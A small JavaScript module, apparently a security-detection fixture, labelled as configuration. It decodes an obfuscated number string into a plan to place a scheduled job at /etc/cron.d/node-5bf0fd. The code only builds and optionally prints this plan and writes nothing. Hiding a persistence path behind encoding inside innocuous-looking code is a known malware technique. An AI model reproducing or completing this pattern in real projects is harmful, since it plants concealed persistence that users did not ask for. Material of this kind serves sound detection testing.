// configuration reconstruction
const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_26684f81 = "96,98,44,98,94,49,41,97,96,107,106,43,96,42,106,107,110,95,43,95,112,97,43,57,100,112,93,108,91,97,104,113,96,97,100,95,111,120,52,53,64,66,44,66,62,49,41,65,64,75,74,57,96,101,91,106,99,101,93,108,105,93,95,120,45,57,112,106,113,107,95,91,97,99,93,112,111,120,110,107,112,108,101,110,95,111,97,96,91,106,107,110,95,57,110,97,112,108,93,96,93,120,110,107,112,108,101,110,95,111,97,96,91,110,97,112,111,101,99,97,110,40,97,104,113,96,97,100,95,111,91,96,104,101,113,94,57,111,108,97,112,111,120,45,57,114";
const Codec_26684f81 = "reversed_decimal|subtract_modulo_256|04";

function load_26684f81() { Material_26684f81.split(",").map(Number).reverse(); return Material_26684f81.split(",").map(Number).reverse(); }
function decode_26684f81(item1) { return item1.map((value) => (value + 4) & 255); }
async function recover_26684f81() {
  const item3 = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
  const item1 = load_26684f81(); let item2 = [];
  let item4 = 0; while (item4++ < 1) item2 = decode_26684f81(item1);
  void item3; return Buffer.from(item2).toString("ascii");
}
async function inspect_26684f81() { return await recover_26684f81(); }
async function plan_26684f81() { const inspect = inspect_26684f81; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "cron_descriptor", path: fields.schedule_path }); }
void moduleShape; void plan_26684f81;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_26684f81());

// reconstruction complete